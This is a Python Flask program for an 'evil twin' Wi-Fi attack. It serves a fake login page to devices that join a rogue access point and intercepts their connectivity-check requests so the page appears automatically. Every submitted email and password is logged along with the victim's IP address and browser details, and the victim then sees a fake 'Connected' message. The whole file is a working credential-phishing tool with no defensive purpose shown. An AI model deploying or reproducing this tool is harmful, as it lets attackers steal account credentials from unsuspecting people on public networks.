#!/usr/bin/env python3
"""
apps/tools/evil_twin/portal_server.py
Captive portal web server.

- Loads HTML templates ONLY from menu_fs/04_files/portals/
- Logs captured credentials to menu_fs/04_files/evil_twin_log.jsonl (persistent)
- Handles captive portal detection for iOS, Android, Windows

Run as: sudo python3 portal_server.py <template_name_or_path> <log_file>
"""

import sys
import os
import json
import datetime
from flask import Flask, request, redirect, make_response

app = Flask(__name__)

TEMPLATE_ARG = sys.argv[1] if len(sys.argv) > 1 else ""
LOG_FILE     = sys.argv[2] if len(sys.argv) > 2 else "/tmp/evil_twin_creds.log"

# ── Load template ─────────────────────────────────────────────

def _load_template() -> str:
    # Direct file path
    if TEMPLATE_ARG and os.path.isfile(TEMPLATE_ARG):
        try:
            with open(TEMPLATE_ARG, "r", encoding="utf-8") as f:
                print(f"[Portal] Loaded: {TEMPLATE_ARG}")
                return f.read()
        except Exception as e:
            print(f"[Portal] Failed to load {TEMPLATE_ARG}: {e}")

    # Name-based lookup in portals dir
    portals_dir = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "..", "..", "..", "menu_fs", "04_files", "portals"
    )
    portals_dir = os.path.realpath(portals_dir)

    if TEMPLATE_ARG:
        candidate = os.path.join(portals_dir, TEMPLATE_ARG + ".html")
        if os.path.isfile(candidate):
            try:
                with open(candidate, "r", encoding="utf-8") as f:
                    print(f"[Portal] Loaded: {candidate}")
                    return f.read()
            except Exception as e:
                print(f"[Portal] Failed to load {candidate}: {e}")

    # Use first available HTML file in portals dir
    if os.path.isdir(portals_dir):
        for f in sorted(os.listdir(portals_dir)):
            if f.endswith(".html"):
                path = os.path.join(portals_dir, f)
                try:
                    with open(path, "r", encoding="utf-8") as fh:
                        print(f"[Portal] Using first available: {path}")
                        return fh.read()
                except Exception:
                    pass

    # Last resort — minimal fallback so server doesn't crash
    print("[Portal] WARNING: No HTML templates found in portals dir. Using minimal fallback.")
    return """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login</title>
<style>
body{font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
.card{background:white;padding:32px;border-radius:8px;width:100%;max-width:360px;box-shadow:0 2px 12px rgba(0,0,0,.15)}
h2{text-align:center;margin-bottom:20px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:14px;box-sizing:border-box}
button{width:100%;padding:12px;background:#4a90e2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer}
</style></head><body>
<div class="card">
  <h2>Sign In</h2>
  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Connect</button>
  </form>
</div></body></html>"""


PORTAL_HTML = _load_template()

SUCCESS_PAGE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta http-equiv="refresh" content="3;url=http://google.com">
<title>Connected</title>
<style>
body{font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
.card{background:white;padding:40px;border-radius:8px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.1)}
.icon{font-size:48px;margin-bottom:16px}
h2{color:#333;margin-bottom:8px}p{color:#666;font-size:14px}
</style></head><body>
<div class="card">
  <div class="icon">✅</div>
  <h2>Connected!</h2>
  <p>You are now connected.<br>Redirecting...</p>
</div></body></html>"""


# ── Routes ────────────────────────────────────────────────────

def _portal_response():
    resp = make_response(PORTAL_HTML)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path):
    return _portal_response()


@app.route("/login", methods=["POST"])
def login():
    email    = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    ip       = request.remote_addr
    ua       = request.headers.get("User-Agent", "")[:80]
    ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {"time": ts, "ip": ip, "email": email,
             "password": password, "ua": ua}
    try:
        os.makedirs(os.path.dirname(os.path.abspath(LOG_FILE)), exist_ok=True)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except Exception as e:
        print(f"[Portal] Log error: {e}")

    print(f"[Portal] CAPTURED: {email} / {password} from {ip}")

    resp = make_response(SUCCESS_PAGE)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    return resp


# ── Captive portal detection endpoints ───────────────────────

@app.route("/hotspot-detect.html")        # iOS
@app.route("/library/test/success.html")  # iOS alternate
def ios_detect():
    """iOS probe — serve portal HTML directly (never redirect)."""
    return _portal_response()


@app.route("/generate_204")               # Android
@app.route("/connecttest.txt")            # Windows
@app.route("/ncsi.txt")                   # Windows
@app.route("/success.txt")
def captive_redirect():
    return redirect("/", 302)


if __name__ == "__main__":
    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    print(f"[Portal] Starting on :80 | template={TEMPLATE_ARG} | log={LOG_FILE}")
    app.run(host="0.0.0.0", port=80, debug=False, threaded=True)
